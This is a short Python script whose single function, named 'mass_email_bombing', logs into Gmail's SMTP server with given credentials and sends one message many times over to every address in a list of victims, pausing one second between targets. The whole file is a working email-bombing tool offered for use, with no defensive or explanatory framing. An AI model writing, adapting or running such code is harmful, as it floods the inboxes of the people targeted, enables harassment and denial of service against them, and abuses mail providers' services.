import smtplib
import time

def mass_email_bombing(victime_file, email, password, message, message_relode):

    bomb_emails = str(victime_file).split("\n")

    mail = smtplib.SMTP('smtp.gmail.com',587)
    mail.ehlo()
    mail.starttls()
    mail.login(email,password)

    for bomb_email in bomb_emails:
        for x in range(0, message_relode):
            mail.sendmail(email,bomb_email,message)
        time.sleep(1)

    mail.close()

    return "Mass Email Bombing Completed"
